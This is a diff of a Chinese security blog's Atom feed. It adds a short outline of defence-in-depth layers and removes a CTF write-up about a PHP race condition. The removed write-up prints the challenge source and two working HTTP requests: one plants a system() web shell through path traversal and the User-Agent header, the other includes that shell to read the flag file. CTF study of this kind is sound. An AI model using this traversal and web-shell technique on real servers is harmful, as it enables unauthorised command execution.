@@ -6,10 +6,36 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://hebic.me/"/>
-  <updated>2018-11-02T12:42:26.442Z</updated>
+  <updated>2018-11-03T07:50:10.343Z</updated>
   <id>http://hebic.me/</id>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>纵深防御体系概览</title>
+    <link href="http://hebic.me/2018/11/03/%E7%BA%B5%E6%B7%B1%E9%98%B2%E5%BE%A1%E4%BD%93%E7%B3%BB%E6%A6%82%E8%A7%88/"/>
+    <id>http://hebic.me/2018/11/03/纵深防御体系概览/</id>
+    <published>2018-11-03T07:49:44.000Z</published>
+    <updated>2018-11-03T07:50:10.343Z</updated>
+    
+    <content type="html"><![CDATA[<ul><li>第一层：安全域：业务视角划分安全等级</li><li>第二层：基于第二层的隔离：VPC/VxLan/Vlan</li><li>第三层：端口协议过滤：L3 ACL/L4 Netfilter</li><li>第四层：应用安全：WAF</li><li>第五层：容器安全：Jvm/Zend hook API/Nginx、tomcat加固</li><li>第六层：系统层防御和提权：DEP&amp;ASLR、StackCanay、SELinux</li><li>第七层：防止内核空间乱入：禁用LKM，限制/dev/mem</li><li>第八层：Hypervisor保护：防止逃逸</li></ul>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;ul&gt;
+&lt;li&gt;第一层：安全域：业务视角划分安全等级&lt;/li&gt;
+&lt;li&gt;第二层：基于第二层的隔离：VPC/VxLan/Vlan&lt;/li&gt;
+&lt;li&gt;第三层：端口协议过滤：L3 ACL/L4 Netfilter&lt;/li&gt;
+&lt;li&gt;第四层：应用安全：WAF&lt;/li&gt;
+&lt;li&gt;第五层：
+      
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Linux rootkit 初探</title>
@@ -424,29 +450,6 @@
       
         &lt;h3 id=&quot;PHP可以命令执行的函数&quot;&gt;&lt;a href=&quot;#PHP可以命令执行的函数&quot; class=&quot;headerlink&quot; title=&quot;PHP可以命令执行的函数&quot;&gt;&lt;/a&gt;PHP可以命令执行的函数&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Exec()&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;&lt;co
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>四川省大学生信息安全线上VulC0d3 WriteUp</title>
-    <link href="http://hebic.me/2017/09/19/%E5%9B%9B%E5%B7%9D%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BA%BF%E4%B8%8AVulC0d3%20WriteUp/"/>
-    <id>http://hebic.me/2017/09/19/四川省大学生信息安全线上VulC0d3 WriteUp/</id>
-    <published>2017-09-19T08:32:04.000Z</published>
-    <updated>2017-09-26T11:01:24.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>一道条件竞争的ctf题目。</p><p>打开题目就可以看到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">Hello!</span><br><span class="line">REMOTE_ADDR: <span class="number">192.168</span><span class="number">.200</span><span class="number">.46</span></span><br><span class="line">HTTP_USER_AGENT: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">55.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">55.0</span></span><br><span class="line">REQUEST_TIME: <span class="number">1505782701</span></span><br><span class="line">  </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">'ROOT_PATH'</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(ROOT_PATH.<span class="string">"/functions.php"</span>);</span><br><span class="line"></span><br><span class="line">$sessionid = <span class="keyword">isset</span>($_GET[<span class="string">'sessionid'</span>])?$_GET[<span class="string">'sessionid'</span>]:<span class="string">''</span>; <span class="comment">//APP调用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($sessionid != <span class="string">''</span>)&#123;</span><br><span class="line">    session_id($sessionid);</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$class = <span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) ? strtolower(trim($_GET[<span class="string">'class'</span>])) : <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($class == <span class="string">''</span>) &#123;</span><br><span class="line">    header(<span class="string">"location: ./index.php?class=index"</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!file_exists(ROOT_PATH.<span class="string">"/Class/&#123;$class&#125;.class.inc"</span>))</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ROOT_PATH.<span class="string">"/Class/&#123;$class&#125;.class.inc"</span>);</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> $class();</span><br><span class="line">$obj-&gt;execute();</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>题目默认require /Class/index.class.inc，下载下来读。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> $cachefile;</span><br><span class="line">    <span class="keyword">private</span> $logdata;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $sessionid;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;cachefile = ROOT_PATH . <span class="string">"/Cache/&#123;$sessionid&#125;.inc"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;cachefile)) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logdata = GetUserLog();</span><br><span class="line">            file_put_contentsfa(<span class="keyword">$this</span>-&gt;cachefile, json_encode(<span class="keyword">$this</span>-&gt;logdata));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;logdata = json_decode(file_get_contents(<span class="keyword">$this</span>-&gt;cachefile), <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">execute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;b&gt;Hello!&lt;/b&gt;&lt;br&gt;\n"</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;logdata <span class="keyword">as</span> $key =&gt; $item) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;b&gt;&#123;$key&#125;:&lt;/b&gt; "</span> . htmlspecialchars($item) . <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (SaveUserLog(<span class="keyword">$this</span>-&gt;logdata)) &#123; <span class="comment">//将请求日志保存到数据库</span></span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;cachefile);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>php逻辑是判断session缓存是否存在，不存在把头部一些信息保存到Cache/$sessionid.inc中，存在读出来。在php结束后删除缓存。期间index.php调用execute读出到首页中。</p><p>思路1：session缓存写到Class文件夹中利用首页的require包含，但是试了各种文件:均没有写权限。</p><p>思路2：session写到Cache文件夹中利用\$sessionid包含Cache文件夹中的缓存。但<code>$sessionid = isset($_GET[&#39;sessionid&#39;])?$_GET[&#39;sessionid&#39;]:&#39;&#39;;</code> 不可以有大写字母，放弃。</p><p>思路3：发现/tmp 文件可写，利用思路一，写入/tmp文件夹，然后包含。</p><p>在inc文件的最后有一行删除文件，要赶在删除文件前运行他。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?class=index&amp;sessionid=../../../../../../tmp/testaaaaaa.class HTTP/1.1</span><br><span class="line">Host: 192.168.5.16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &apos;§&quot;§&lt;?php system($_GET[1]);?&gt;</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=8o2ro21487qmti39vpshr5ji75</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?class=../../../../../../../tmp/testaaaaaa&amp;1=cat+f1aG_30bd87Sjhe6d.php HTTP/1.1</span><br><span class="line">Host: 192.168.5.16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: &apos;§&quot;§</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8</span><br><span class="line">Cookie: PHPSESSID=8o2ro21487qmti39vpshr5ji75</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>用burp的线程跑起来，并在删除之前命令执行。</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;一道条件竞争的ctf题目。&lt;/p&gt;
-&lt;p&gt;打开题目就可以看到源码：&lt;/p&gt;
-&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp
       
     
     </summary>
